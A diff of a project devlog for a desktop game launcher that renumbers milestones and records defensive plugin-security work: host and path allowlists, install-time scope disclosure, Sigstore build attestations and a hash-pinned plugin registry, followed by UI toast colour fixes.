 - New `plugin.json` field `httpScopes: string[]`, parsed into `PluginHostState.http_scopes`, checked by `is_allowed_host` (`wasm_plugins.rs`) before every `do_http_get`/`do_http_request`/`do_download_bytes` call. Parses the URL via `reqwest::Url` (already a transitive dependency, no new crate needed) and matches the host against each scope entry either exactly or as a subdomain suffix (`host.ends_with(".{scope}")`) - declaring `"github.com"` alone covers both `github.com` and `api.github.com` without listing every subdomain. Only the plugin-supplied entry URL is checked; whatever redirect chain the HTTP client follows internally afterward (e.g. GitHub's release-asset CDN) is out of scope, same as how this kind of check normally works everywhere else
 - No WIT change needed this time (unlike `request-read-scope`) - `http-get`/`http-request`/`download-bytes`'s signatures are unchanged, only the host-side enforcement wrapping them changed, so no plugin repo needed a rebuild for the *mechanism* itself
 - Declared `httpScopes` in the five plugins that actually make network calls, each bumped `0.2.0` → `0.3.0` (manifest-only change, no Rust source touched, so no rebuild needed for these five either - just the `plugin.json` itself): `locale-remulator-wasm-plugin`/`locale-emulator-wasm-plugin` → `["github.com"]`; `igdb-metadata-wasm-plugin` → `["id.twitch.tv", "api.igdb.com"]` (two unrelated domains, Twitch OAuth vs. IGDB's own API, declared separately since neither is a subdomain of the other); `sgdb-metadata-wasm-plugin` → `["steamgriddb.com"]`; `rawg-metadata-wasm-plugin` → `["api.rawg.io"]`. Steam/GOG/Epic get no `httpScopes` entry at all - correctly matches their real zero-network-calls behavior, no explicit empty array needed since `#[serde(default)]` already means "no scopes granted"
 - Rejected the milestone wording's "rate-limiting" alternative outright once the real-usage data was in - it doesn't stop a plugin talking to an attacker's server, only slows down how often, which isn't the actual threat (exfiltration happening at all, not exfiltration happening *fast*). The allowlist is a real fix for the real risk; rate-limiting would have been security theater layered on top of an still-open hole
 
-Milestone 13 is now fully closed - all four items (honest risk warning, path allowlisting, spawn-process/run-and-wait permission gating, URL allowlisting) done. Main README's security note updated to drop the "network access is unrestricted" caveat, replaced with the real remaining scope (nothing - every host-exposed capability that mattered is now gated, scoped, or requires an explicit grant).
+Milestone 12 is now fully closed - all four items (honest risk warning, path allowlisting, spawn-process/run-and-wait permission gating, URL allowlisting) done. Main README's security note updated to drop the "network access is unrestricted" caveat, replaced with the real remaining scope (nothing - every host-exposed capability that mattered is now gated, scoped, or requires an explicit grant).
 
 **Follow-up, prompted by a genuinely important question**: "wouldn't this approach be dangerous in any circumstance?" Answered honestly rather than just restating what the mechanism does: `pathScopes`/`httpScopes` are entirely self-declared by the plugin's own `plugin.json` - unlike the `run-programs` capability grant (a real out-of-band step, the *user* has to click Grant), nothing stops a malicious plugin author from just declaring their own exfiltration server as an `httpScope` and having the check pass trivially. It only catches a plugin reaching *beyond* what it declared (scope creep, bugs, a compromised dependency), not a plugin that's malicious from the point of declaring its own manifest. That's a real, structural gap versus the capability-grant mechanism - and unlike that one, `pathScopes`/`httpScopes` were completely invisible to the user at install time, no equivalent of the `run-programs` checkbox existed for them at all.
-- Fixed the visibility gap: `PluginPreview` (`plugin_installer.rs`) gained `path_scopes`/`http_scopes` fields (the `PathScope` enum gained `Serialize` alongside its existing `Deserialize` so it can round-trip to the frontend), populated in `fetch_plugin_preview` for source/metadata-kind previews (empty for themes, which have no scope concept). `ConfirmInstall.vue` now renders a "Declares access to:" list (registry keys, path prefixes, hostnames) alongside the existing risk-warning text and the `run-programs` checkbox - visibility only, explicitly not a new enforcement step (the host enforces `pathScopes`/`httpScopes` identically whether or not anyone reads this list). Rewrote the dialog's blanket "runs with the same file and network access as any program" copy too, since it was flatly wrong post-M13 (an undeclared-scope plugin now gets essentially nothing - no network at all, no files outside its own `plugin-dir()`) - replaced with an honest statement that access is scoped to what's declared below, but that declaration is self-reported by the plugin's own author, not verified against what the code actually does
-- Doesn't change the underlying trust model at all - this is groundwork for a human (or, someday, tooling) to actually *look* at what a plugin claims before installing, not a new security boundary. Real authenticity verification (is this plugin's declared behavior actually what it does) is still Milestone 14's job, not this one's
+- Fixed the visibility gap: `PluginPreview` (`plugin_installer.rs`) gained `path_scopes`/`http_scopes` fields (the `PathScope` enum gained `Serialize` alongside its existing `Deserialize` so it can round-trip to the frontend), populated in `fetch_plugin_preview` for source/metadata-kind previews (empty for themes, which have no scope concept). `ConfirmInstall.vue` now renders a "Declares access to:" list (registry keys, path prefixes, hostnames) alongside the existing risk-warning text and the `run-programs` checkbox - visibility only, explicitly not a new enforcement step (the host enforces `pathScopes`/`httpScopes` identically whether or not anyone reads this list). Rewrote the dialog's blanket "runs with the same file and network access as any program" copy too, since it was flatly wrong post-M12 (an undeclared-scope plugin now gets essentially nothing - no network at all, no files outside its own `plugin-dir()`) - replaced with an honest statement that access is scoped to what's declared below, but that declaration is self-reported by the plugin's own author, not verified against what the code actually does
+- Doesn't change the underlying trust model at all - this is groundwork for a human (or, someday, tooling) to actually *look* at what a plugin claims before installing, not a new security boundary. Real authenticity verification (is this plugin's declared behavior actually what it does) is still Milestone 13's job, not this one's
 
-## Milestone 14 — Plugin Trust Model: Signing & Review (stretch)
-Follow-up question after scoping Milestone 13: does capability sandboxing alone answer "should I trust this plugin at all," and separately, does the WASM choice itself get undermined by any of this? Recap of Milestone 8's actual reasoning first, since that was worth re-checking before adding more scope on top of it - WASM was picked specifically to avoid native dylib loading (`libloading`), which would have meant unsandboxed, unbounded arbitrary code execution with no enumerable capability surface at all. Even with Milestone 13 still open, WASM already delivers on that: memory safety is real (a plugin can't corrupt host memory or make arbitrary syscalls), and the full set of things a plugin could possibly do is the finite, auditable list in `wit/plugin.wit` - a native dylib would have had none of that. Milestone 13's gap (those enumerated functions being currently unscoped) is a defense-in-depth layer on top of a still-sound original decision, not evidence the decision was wrong. Milestone 14 is a third, further layer again - it doesn't answer "what can a plugin technically do" (that's Milestone 13), it answers "should this specific plugin be trusted to run at all," which capability sandboxing can never answer on its own.
+## Milestone 13 — Plugin Trust Model: Signing & Review (stretch)
+Follow-up question after scoping Milestone 12: does capability sandboxing alone answer "should I trust this plugin at all," and separately, does the WASM choice itself get undermined by any of this? Recap of Milestone 8's actual reasoning first, since that was worth re-checking before adding more scope on top of it - WASM was picked specifically to avoid native dylib loading (`libloading`), which would have meant unsandboxed, unbounded arbitrary code execution with no enumerable capability surface at all. Even with Milestone 12 still open, WASM already delivers on that: memory safety is real (a plugin can't corrupt host memory or make arbitrary syscalls), and the full set of things a plugin could possibly do is the finite, auditable list in `wit/plugin.wit` - a native dylib would have had none of that. Milestone 12's gap (those enumerated functions being currently unscoped) is a defense-in-depth layer on top of a still-sound original decision, not evidence the decision was wrong. Milestone 13 is a third, further layer again - it doesn't answer "what can a plugin technically do" (that's Milestone 12), it answers "should this specific plugin be trusted to run at all," which capability sandboxing can never answer on its own.
 
 Prompted by a real, concrete question: GitHub computes and shows a SHA256 digest for every release asset - is that useful here? Worth being precise about what it actually proves. It's an **integrity** guarantee (the bytes weren't corrupted or tampered with in transit) - it is not an **authenticity** guarantee, because the hash is served by the same channel/account as the artifact itself. If a repo or account is compromised and a malicious release goes up, GitHub computes an equally legitimate-looking hash for that malicious file too - the hash and the artifact share a trust root, so it can't vouch for that root. That's exactly what real code signing (a private key held independently of the hosting channel, verified against a public key the client already trusts) is for, and a self-reported GitHub digest doesn't substitute for it.
 
-That said, a cheap design does fall out of it: a separate whitelist repo/wiki, maintained by hand, listing `{plugin id, version, manifest URL, expected sha256}` - the app would check a downloaded plugin's actual hash against the *pinned* value in that separate registry, not against whatever hash the plugin's own release currently self-reports. This collapses two of the three Milestone 14 bullets into one lightweight, actually-buildable piece: it's a real curated registry (an entry only exists because someone reviewed and pinned it), and revocation comes for free (pulling or flagging a bad entry there *is* revocation - no separate mechanism needed). It does not give the signing bullet - the trust root becomes "whoever has write access to the whitelist repo" rather than a cryptographic identity, which is a legitimate, much simpler trust model appropriate for a personal-scale project, just not equivalent to real PKI-based code signing. Left Milestone 14's three bullets as-is rather than rewriting them around this - the whitelist repo is one possible future implementation of two of the three, not a redefinition of the milestone itself.
+That said, a cheap design does fall out of it: a separate whitelist repo/wiki, maintained by hand, listing `{plugin id, version, manifest URL, expected sha256}` - the app would check a downloaded plugin's actual hash against the *pinned* value in that separate registry, not against whatever hash the plugin's own release currently self-reports. This collapses two of the three Milestone 13 bullets into one lightweight, actually-buildable piece: it's a real curated registry (an entry only exists because someone reviewed and pinned it), and revocation comes for free (pulling or flagging a bad entry there *is* revocation - no separate mechanism needed). It does not give the signing bullet - the trust root becomes "whoever has write access to the whitelist repo" rather than a cryptographic identity, which is a legitimate, much simpler trust model appropriate for a personal-scale project, just not equivalent to real PKI-based code signing. Left Milestone 13's three bullets as-is rather than rewriting them around this - the whitelist repo is one possible future implementation of two of the three, not a redefinition of the milestone itself.
 
 **Follow-up: the signing bullet isn't actually the heavy one either.** A second real, concrete question - "wasn't there a free option to get artifacts code-signed through GitHub Actions?" - turned up GitHub Artifact Attestations (`actions/attest-build-provenance`, GA since June 2024). Free for public repos (every plugin repo is public), it uses Sigstore's public-good instance: a short-lived signing certificate gets issued bound to the GitHub Actions OIDC token for that specific run (repo + workflow + commit), the artifact gets signed with it, and the signed attestation is written to Rekor - a public, append-only transparency log independent of the repo/account itself. This is the missing piece from the SHA256 discussion above: the trust root moves from "whoever controls the repo/hosting channel" to Sigstore's transparency log, so a compromised repo account can't retroactively forge a legitimate-looking attestation for a malicious release the way it can for a self-reported hash. Verification is a single command, `gh attestation verify <file> --repo <owner>/<repo>`.
 
-Net effect on Milestone 14: the signing bullet goes from "distinct, heavier tier, unlikely to be worth building" to "one extra CI step (`actions/attest-build-provenance`) plus one verify call in the app's install flow (`fetch_wasm_plugin_manifest`/`install_wasm_plugin` in `wasm_plugin_installer.rs` would be the natural place)." Not wired in yet - documented in `milestones.md`'s Milestone 14 note as the concrete answer, held off on implementation per explicit instruction to update the note first and wire it in later.
+Net effect on Milestone 13: the signing bullet goes from "distinct, heavier tier, unlikely to be worth building" to "one extra CI step (`actions/attest-build-provenance`) plus one verify call in the app's install flow (`fetch_wasm_plugin_manifest`/`install_wasm_plugin` in `wasm_plugin_installer.rs` would be the natural place)." Not wired in yet - documented in `milestones.md`'s Milestone 13 note as the concrete answer, held off on implementation per explicit instruction to update the note first and wire it in later.
 
-**Signing, implemented.** Picked up directly after M13 closed. Before building anything, the user asked the exact right question first: "how can I tell if a repo author is malicious so he wrote malicious code inside wasm and signed it?" Worth being honest about the answer rather than glossing past it - signing proves **provenance/integrity** ("this artifact really is what that repo's CI produced from that commit, unmodified since"), not **trustworthiness**. A repo owner who writes malicious code from day one gets a perfectly valid attestation for it - their own CI genuinely built and signed exactly what they committed, Sigstore has no opinion on intent. What signing actually stops is a *different*, narrower class of attack: tampering after the fact (a compromised CDN, a stolen release token pushing an asset that never went through the real commit-and-build flow, a hijacked repo slipping in a rogue release). Answering "is this author trustworthy" is the milestone's *other* two bullets (curated registry, revocation), not this one - built anyway since it's real, narrower value, not a substitute for those.
+**Signing, implemented.** Picked up directly after M12 closed. Before building anything, the user asked the exact right question first: "how can I tell if a repo author is malicious so he wrote malicious code inside wasm and signed it?" Worth being honest about the answer rather than glossing past it - signing proves **provenance/integrity** ("this artifact really is what that repo's CI produced from that commit, unmodified since"), not **trustworthiness**. A repo owner who writes malicious code from day one gets a perfectly valid attestation for it - their own CI genuinely built and signed exactly what they committed, Sigstore has no opinion on intent. What signing actually stops is a *different*, narrower class of attack: tampering after the fact (a compromised CDN, a stolen release token pushing an asset that never went through the real commit-and-build flow, a hijacked repo slipping in a rogue release). Answering "is this author trustworthy" is the milestone's *other* two bullets (curated registry, revocation), not this one - built anyway since it's real, narrower value, not a substitute for those.
 
 - **Dependency research, the hard way.** First candidate, `sigstore-verification` (jdx), had exactly the convenience API wanted (`verify_github_attestation(path, owner, repo, ...)`) - but a direct GitHub API check (not just a scraped page, which claimed the same thing and could have been a hallucination) confirmed it was archived days earlier, mid-release (issue for v0.2.9 still open). Depending on an abandoned crate for cryptographic verification was rejected outright regardless of why it was archived - no future patches if Sigstore's bundle format or GitHub's API shape changes. Found the real answer instead: `sigstore/sigstore-rust` (official Sigstore org, pushed the day before this work, split into focused crates - `sigstore-verify`, `sigstore-trust-root`, `sigstore-bundle`, `sigstore-types`). Lower-level than the archived convenience wrapper (no GitHub-specific one-call function), so the actual GitHub-attestation flow had to be built out of primitives, but on a maintained, official foundation instead of an abandoned side project
 - **Exact API confirmed by reading the real crate source** (`~/.cargo/registry/src/.../sigstore-verify-0.1.1/src/verify.rs`) rather than trusting scraped docs.rs summaries again, which had already been unreliable twice in this same research pass (one page hallucinated missing param types, another apparently missed the `bundle` field GitHub's own OpenAPI schema clearly has). `TrustedRoot::production()` turned out to be fully embedded (`include_str!` of a bundled `trusted_root.json`) - no live TUF fetch needed for the trust root at all, only the attestation bundle itself needs a real network call (to GitHub's own API, unavoidable). GitHub's authoritative OpenAPI spec (`github/rest-api-description`) confirmed the exact response shape (`attestations[].bundle`, matching `sigstore_types::Bundle`'s JSON shape directly - `mediaType`/`verificationMaterial`/flattened DSSE content)
 - **A real, separate toolchain gap surfaced along the way**: `aws-lc-sys` (pulled in transitively for the crypto backend) needs NASM installed on Windows, and none of `scoop`/`choco`/`winget` actually got it working from this Bash-tool session - `winget install` reported success but the package never registered (likely tied to a known-broken Windows user profile on this machine), `choco` needed admin elevation this session didn't have. Worked around entirely by downloading NASM's own portable zip and prepending it to `PATH` for the build session - no system install needed at all. Separately, PowerShell resolves Windows-native tool paths more reliably than this session's Git-Bash/MSYS shell for anything spawning native `.exe`s (confirmed earlier in the SSH-signing saga too) - used PowerShell for every Rust build from this point on
 - **New host module** `plugin_verification.rs` (not a separate crate/repo - discussed explicitly with the user first: this is core, always-trusted host infrastructure with exactly one caller and no reuse case, unlike WASM plugins' own separate-repo pattern, which exists specifically to prove the "install arbitrary third-party code" model holds). `parse_github_owner_repo(url)` extracts `{owner, repo}` from a `github.com` manifest URL; `verify_plugin_provenance(bytes, owner, repo)` computes the artifact's SHA256, fetches `GET /repos/{owner}/{repo}/attestations/sha256:{digest}`, parses out the bundle, and calls `sigstore_verify::verify_with_trusted_root` with a policy requiring `issuer = https://token.actions.githubusercontent.com` and `identity = https://github.com/{owner}/{repo}/.github/workflows/publish.yml@refs/heads/main` - hardcoded to match every one of this project's own plugin repos' actual `publish.yml` convention (workflow literally named `publish.yml`, triggered on push to `main`); a repo using a different filename/branch would need this updated, no generic way to discover that
 - **Advisory, not enforced, deliberately** - `install_wasm_plugin` (`plugin_installer.rs`) attempts verification and returns the outcome (`InstallResult { id, verified, verification_note }`) but never blocks the install on failure. Hard-rejecting wasn't viable yet: not one single existing plugin release predates this feature, so every currently-published release would fail verification (no attestation exists for it) and every install-by-URL would break until each repo's CI ships a new signed release. `pluginInstall.ts` toasts the outcome after install completes rather than showing it in `ConfirmInstall.vue` up front like `pathScopes`/`httpScopes` were - verification needs the actual downloaded `.wasm` bytes to hash, which `fetch_plugin_preview` deliberately never downloads (stays a lightweight manifest-only fetch), so there's no point before install exists to check it at
-- **A real regression from the *previous* milestone item caught along the way**: running the actual test suite (`cargo test`, not just `cargo check --tests` which only type-checks) for the first time since the M13 path-allowlisting work revealed the reference `exe-scanner-plugin` end-to-end test had been silently broken - its fixture manifest declared no `pathScopes`, so its legitimate scan of a directory outside its own `plugin-dir()` (a stand-in for a real "user-configured scan folder" pattern) now correctly got rejected. Fixed by having the test declare a `pathScopes` entry for its own temp scan directory, same as a real plugin author would - not a workaround, the test fixture was simply out of date with the enforcement it was supposed to be exercising. A good reminder that `cargo check` isn't a substitute for `cargo test` even when nothing was consciously being changed in that area
+- **A real regression from the *previous* milestone item caught along the way**: running the actual test suite (`cargo test`, not just `cargo check --tests` which only type-checks) for the first time since the M12 path-allowlisting work revealed the reference `exe-scanner-plugin` end-to-end test had been silently broken - its fixture manifest declared no `pathScopes`, so its legitimate scan of a directory outside its own `plugin-dir()` (a stand-in for a real "user-configured scan folder" pattern) now correctly got rejected. Fixed by having the test declare a `pathScopes` entry for its own temp scan directory, same as a real plugin author would - not a workaround, the test fixture was simply out of date with the enforcement it was supposed to be exercising. A good reminder that `cargo check` isn't a substitute for `cargo test` even when nothing was consciously being changed in that area
 - CI: `actions/attest-build-provenance@v2` added to all 8 plugin repos' `publish.yml` (new `id-token: write`/`attestations: write` permissions, one step staged right after building, before the release gets published), each bumped `0.3.0` → `0.3.1` specifically to force a new release through (without a version bump, the "already published, skip" check would never let a new signed release actually get cut, since the workflow's own path filters don't include `.github/workflows/**`). Every plugin README gained a `## Signing` section with the `gh attestation verify` command and an honest note about what's actually being proven
 
-**Curated registry + revocation, both closed in one piece - Milestone 14 fully done.** Picked up immediately after signing, same session. Scoped down first via `AskUserQuestion`: install-time hash-pin check only, no startup revocation re-check against already-installed plugins - kept for a later pass if it turns out to matter, rather than building speculative UI for a case that hasn't come up yet.
+**Curated registry + revocation, both closed in one piece - Milestone 13 fully done.** Picked up immediately after signing, same session. Scoped down first via `AskUserQuestion`: install-time hash-pin check only, no startup revocation re-check against already-installed plugins - kept for a later pass if it turns out to matter, rather than building speculative UI for a case that hasn't come up yet.
 - New repo `concourse-plugin-registry` - a single `registry.json`, one entry per hand-reviewed plugin: `{id, name, kind, repo, manifestUrl, wasmSha256}`. `manifestUrl` always points at a specific tagged release (`releases/download/vX.Y.Z/...`), never `releases/latest/...` - pinning against "latest" would mean silently trusting whatever gets published next with zero review of it, defeating the entire point. Bumping which version is listed is a deliberate manual edit (re-download, re-review, re-hash, re-pin), not automatic. README states plainly what "reviewed" actually means right now (one person, `smh0505`, reading the pinned commit before adding it) rather than implying a moderation process that doesn't exist
 - `wasmSha256` computed from the *actual published release asset*, not self-reported by the plugin's own CI and not the same value as the Sigstore attestation's own digest - downloaded and hashed all 8 real `v0.3.1` release artifacts for real (`sha256sum`) rather than trusting a locally-rebuilt copy, since a real pin has to match what a user would actually download
 - `scripts/validate.sh` + a CI workflow re-derives every entry's hash from its live `manifestUrl` on every push/PR and fails if it doesn't match `wasmSha256` - catches a copy-paste mistake in the registry itself before it ships, not just plugin-side bugs. Verified locally with an equivalent Python script first (no `jq` in this dev environment) before writing the real bash+jq version that actually runs in CI - all 8 entries checked out clean on the first real run
@@ -376,18 +470,21 @@ committing) while explicitly keeping the human review/merge gate - not a request
 
 ## 1.0.0 — Core Roadmap Closed, Post-1.0 Roadmap Opened
 User call: bump `0.10.0` -> `1.0.0` now rather than waiting on the two leftover items (Milestone
-7's ROM scanner sub-item, Milestone 12's Xbox/EA/Ubisoft stretch goal, the latter entirely
-unstarted). Judgment: Milestones 1–6 and 8–11, plus both security milestones (13, 14, the most
-recently closed and arguably the highest-stakes work in the whole roadmap), are done; the two
-remaining items are an unstarted stretch goal and one sub-item of an otherwise-closed polish
-milestone, neither blocking real-world use the way the original "post-M12" versioning note
-implied when it was written (back when M12 was still the *next* milestone in sequence, not a
-skipped-over stretch goal that later milestones passed by).
+7's ROM scanner sub-item, and the core roadmap's Xbox/EA/Ubisoft stretch goal - since moved
+and renumbered to Milestone 16, entirely unstarted at the time). Judgment: Milestones 1–6 and
+8–11, plus both security milestones (now Milestones 12, 13, the most recently closed and
+arguably the highest-stakes work in the whole roadmap), are done; the two remaining items are
+an unstarted stretch goal and one sub-item of an otherwise-closed polish milestone, neither
+blocking real-world use the way the original "post-M12" versioning note implied when it was
+written (back when that stretch goal's original core-roadmap slot was still the *next*
+milestone in sequence under the numbering used at the time, not a skipped-over stretch goal
+that later milestones passed by).
 - Bumped `package.json`, `src-tauri/Cargo.toml`, `src-tauri/tauri.conf.json` to `1.0.0` together;
   `cargo check` regenerated `Cargo.lock`'s matching `concourse` package entry rather than hand-editing it
 - `milestones.md` restructured rather than just bumping the header: Milestone 7's unstarted ROM
-  scanner sub-item and all of Milestone 12 moved out into a new `Post-1.0 Roadmap` section
-  (renumbered Milestone 15/16 there), leaving both source milestones fully checked. Chose to
+  scanner sub-item and the whole Xbox/EA/Ubisoft stretch goal moved out into a new
+  `Post-1.0 Roadmap` section (renumbered Milestone 15/16 there), leaving both source milestones
+  fully checked. Chose to
   keep calling them "Milestones" (not "Phases," despite that being the term floated) - it's the
   same document, same devlog cross-reference convention, just a second wave numbered
   continuously from 14, not a different kind of unit
@@ -402,21 +499,21 @@ constrained template tier), scoped from the Brick Block measurement below. Kept 
 historical record; its actual conclusion (raw-JS/WASM component-override for external plugins is
 blocked) is still correct and unaffected by the entry that replaces it in milestones.md.
 
-Re-review requested directly: does Milestone 13/14 closing change the original Milestone 9
+Re-review requested directly: does Milestone 12/13 closing change the original Milestone 9
 "blocked" verdict on the `slots` tier for external theme plugins? Worth actually re-deriving the
 reasoning rather than reflexively re-affirming the old note, since the premise it was originally
-conditioned on ("not pursued until/unless Milestone 13/14 land") had genuinely changed.
-- Re-traced where Milestone 13's scoping actually lives before concluding anything -
+conditioned on ("not pursued until/unless Milestone 12/13 land") had genuinely changed.
+- Re-traced where Milestone 12's scoping actually lives before concluding anything -
   `grep`-confirmed `host::*` capability gating (path/URL allowlists, spawn-process permission
   gate) is implemented entirely inside `wasm_plugin_runtime.rs`/`wasm_plugins.rs`, i.e. the WASM
-  host-function layer. That's the load-bearing fact: Milestone 13 scopes what a WASM plugin's
+  host-function layer. That's the load-bearing fact: Milestone 12 scopes what a WASM plugin's
   own enumerated primitives can reach, a boundary that only exists *because* WASM plugins go
   through a typed host interface at all. Raw JS via `defineAsyncComponent` was never going to go
   through that layer - it runs directly in the app's own JS realm - so tightening that boundary
   has zero effect on the raw-JS option's actual exposure. The two didn't get closer together;
-  Milestone 13 improved one lane (WASM) that was already separate from the other (raw JS) from
+  Milestone 12 improved one lane (WASM) that was already separate from the other (raw JS) from
   the start
-- Milestone 14 (signing, curated registry, revocation) doesn't move this either, for a different
+- Milestone 13 (signing, curated registry, revocation) doesn't move this either, for a different
   reason: it's a provenance/trust-in-the-author gate applied at install time, not a runtime
   capability boundary. A raw-JS theme bundle that's signed and registry-pinned is still, once
   running, full-realm code with unmediated access to every `#[tauri::command]` and every Pinia
@@ -424,7 +521,7 @@ conditioned on ("not pursued until/unless Milestone 13/14 land") had genuinely c
   to touch once it's executing
 - Net verdict: still blocked, and for the *original* two reasons (WASM structurally can't carry
   a live Vue component; raw JS has no capability boundary to scope at all), not a new one -
-  Milestone 13/14 closing was a real, legitimate reason to re-check, it just doesn't turn out to
+  Milestone 12/13 closing was a real, legitimate reason to re-check, it just doesn't turn out to
   bear on this specific wall. Re-confirmed no third mechanism has emerged since Milestone 9's
   review either - the Vue-runtime-template-compiler idea documented there remains a different,
   narrower feature (a whitelisted template string) than an actual component-override tier, not a
@@ -628,7 +725,7 @@ alternatives (Gemini's suggestions, brought back for a second opinion): iframe s
 server-driven UI via a JSON AST, and code-signed dynamic `import()`. Evaluated each against what
 this milestone had already verified, not just in the abstract:
 - **Code-signed dynamic import - rejected outright.** This is raw-JS `slots` with a signature
-  check added. Milestone 14 already drew this exact distinction: signing proves *provenance*
+  check added. Milestone 13 already drew this exact distinction: signing proves *provenance*
   ("this really came from that repo's CI"), not *safety* - a malicious author's own CI signs
   their malicious code perfectly validly. Doesn't touch the actual problem (full realm access,
   `invoke()` reachable, Pinia reachable) at all - conflating signing with sandboxing was already
@@ -730,7 +827,7 @@ type AstNode =
   left: the manifest-signing addon, and the separately-tracked registry `theme`-kind follow-up
 
 **Built the manifest-signing addon - Milestone 17 fully closed.** `verify_plugin_provenance`
-(Milestone 14) turned out to already be fully generic - it just hashes and Sigstore-verifies
+(Milestone 13) turned out to already be fully generic - it just hashes and Sigstore-verifies
 whatever `&[u8]` it's given, nothing WASM-specific in its own logic at all. The only real work
 was threading a `manifest_url` parameter into `install_data_theme` (previously only took
 `dir`/`manifest_bytes`, no URL - never needed one before) and calling the exact same
@@ -827,7 +924,7 @@ verified the fix for real: checked the compiled CSS output and confirmed the sel
   automated/structural verification (compiled CSS, real validator/interpreter calls). Worth
   running the real app to eyeball it before calling this fully done
 
-**Closed a real gap in theme parity: signing (Milestone 14) and the registry pin (Milestone 17
+**Closed a real gap in theme parity: signing (Milestone 13) and the registry pin (Milestone 17
 follow-up) are separate, complementary mechanisms, and only one of them actually existed for
 themes.** User asked directly why a theme registry entry needs `wasmSha256` at all, given
 `data-theme-plugins` was never wired with the same `actions/attest-build-provenance` step the
@@ -1733,7 +1830,7 @@ theming mechanism in the app, for both desktop and Big Picture, for every theme 
 default, data-only, and any future third-party one) - `slots`/component-swap theming, which only
 ever had one real consumer, no longer exists at all.
 
-**Documentation tidy pass, on user request.** `milestones.md`'s Milestone 14.5/19 sections had
+**Documentation tidy pass, on user request.** `milestones.md`'s Milestone 14/19 sections had
 drifted back into devlog-style multi-line narrative (the pinned-filter-bar saga especially,
 several paragraphs per bullet) - condensed both back to one-line-per-item, matching the
 convention already applied to Milestones 17/18 earlier. Also delegated a codebase-wide sweep
@@ -1745,7 +1842,7 @@ what it is, what would break if changed), dropping the "was"/"previously"/"this 
 originally"/"confirmed by a real test" framing - that history already lives here in devlog.md,
 not in the code itself. Left several comments untouched where the agent's audit found the
 historical framing was actually necessary context (e.g. `plugin_registry.rs`/
-`plugin_verification.rs`'s module docs, most of `wasm_plugins.rs`'s Milestone 13 sandboxing
+`plugin_verification.rs`'s module docs, most of `wasm_plugins.rs`'s Milestone 12 sandboxing
 comments) - not everything referencing a past milestone number is narrative bloat, only where
 the surrounding sentence was pure event narration with no bearing on how to safely edit the code
 today. `bun run build`/`cargo check` both clean (comment-only changes, no behavior change).
@@ -1832,10 +1929,10 @@ plugin, not new application logic with an unknown schema change blocking it.
 
 **Version bump, to actually enable testing the update path - user asked for the correct version
 to be evaluated, not just a placeholder bump.** Checked every milestone heading in
-`milestones.md`: Milestones 1-14 are the 1.0.0 baseline; Milestones 17, 18, and 19 have all
+`milestones.md`: Milestones 1-13 are the 1.0.0 baseline; Milestones 17, 18, and 19 have all
 fully closed since, each a real Post-1.0 Roadmap milestone closure the versioning policy ties
 a minor bump to - but the version string had stayed at `1.0.0` the entire time regardless,
-never actually bumped as those closures happened. Milestone 14.5 doesn't count (explicitly
+never actually bumped as those closures happened. Milestone 14 doesn't count (explicitly
 never closes, by its own definition); Milestone 20 is still in progress, not closed.
 - Correct version: `1.0.0` → `1.3.0` (three missed minor bumps, one per closed Post-1.0
   milestone) → `1.3.1` (patch, for this session's in-progress Milestone 20 work, per "patch
@@ -1975,7 +2072,7 @@ is the flag.
 - `install_wasm_plugin` previously wrote the original downloaded `manifest_bytes` straight to
   `plugin.json` verbatim; changed to serialize the (now-mutated) `manifest` struct instead so
   the injected fields actually persist. Confirmed nothing downstream depends on the file's
-  exact original byte content - Milestone 14's signing check hashes the `.wasm` binary, not
+  exact original byte content - Milestone 13's signing check hashes the `.wasm` binary, not
   `plugin.json`, so re-serializing is safe. `install_data_theme` already serialized the struct
   (not raw bytes), so only needed the two field assignments added, no structural change.
 - **Assessed whether this breaks anything, since it touches a persisted on-disk format the
@@ -2161,96 +2258,3 @@ two competing UI surfaces for the same kind of message.
   re-verified in a running app - same limitation as every other UI change this session, no
   browser/screenshot tooling available in this environment.
 
-**Added a "UI Test" sidebar tab, replacing the earlier throwaway test button.** New
-`AppView` value (`NavSidebar.vue`), new `UiTest.vue` component, wired into `App.vue`'s
-existing view-switch (`v-else-if`/`v-else` chain, now three branches instead of two). Moved
-the manual actionable-toast trigger here from its temporary spot in `AppSettings.vue`, and
-added four more: plain info/success/error toasts, plus a long-message one (to check text
-wrapping/sizing at a size the short test messages never exercised). All five are just manual
-UI-state triggers, not real functionality - explicitly labeled as such in the tab's own
-description text.
-
-**Fixed a real contrast bug in `.toast-info`, found via the Brick Block data theme.** User
-noticed info toasts were hard to read specifically under Brick Block - traced it to
-`.toast-info`'s `background: var(--color-surface1); color: var(--color-text)` pairing:
-Brick Block's `--color-surface1` (`#7c2c00`, a dark saturated brown - the same value used for
-button borders) paired with `--color-text` (`#1a1a2e`, dark navy) gives poor contrast, since
-`--color-text` assumes a light neutral background that `--color-surface1` isn't guaranteed to
-be. This is the exact same problem class already solved for buttons - `--color-button-text`
-exists specifically because "a theme with saturated/dark button backgrounds... can override
-just this one, without also recoloring body text" (its own doc comment in `styles.css`), and
-Brick Block already overrides it to white for that reason. Reused `--color-button-text` for
-`.toast-info` instead of `--color-text` - the default Catppuccin theme is unaffected (that
-token defaults to `var(--color-text)` there), only themes that override it (like Brick Block)
-get the improved contrast. Verified via compiled CSS. `bun run build`/`cargo check` both
-clean.
-
-**Two more toast fixes, both found via Brick Block again.** (1) `.toast-success` and
-`.toast-error` were both red under Brick Block - `--color-accent` (`#e52521`) and
-`--color-danger` (`#b71c1c`) are both red-family hues in that theme's palette, hard to tell
-apart at a glance. Switched `.toast-success` to `--color-accent-alt` instead of
-`--color-accent` - a theme's two brand colors are already meant to be visually distinct from
-each other by construction (that's the whole reason a theme declares two of them), unlike
-`--color-accent` vs `--color-danger`, which nothing guarantees are different hues. Happens to
-also line up with the near-universal "green means success" convention for Brick Block
-specifically (`--color-accent-alt: #43b047`, a real green) and stays a real, distinct color for
-the default Catppuccin theme too (purple vs. red), even though it's not literally "green"
-there. (2) Right-aligned `.toast-actions`' buttons (`justify-content: flex-end`) rather than
-left-flush, per direct request - didn't extend this to the update-offer toast specifically
-since the change is at the shared `.toast-actions` level, so it applies to every actionable
-toast uniformly, not just that one.
-- Verified via compiled CSS: `.toast-success{background:var(--color-accent-alt)}`,
-  `.toast-actions{...justify-content:flex-end...}`. `bun run build`/`cargo check` both clean.
-
-**Follow-up 1: `--color-accent-alt` reuse was wrong, tried a dedicated token.** User caught
-that switching `.toast-success` to `--color-accent-alt` recolors the default Catppuccin Latte
-theme's success toast from its old blue-ish accent to purple (`--color-accent-alt: #8839ef`
-there) - an unintended side effect of a Brick Block-specific fix. Confirmed via
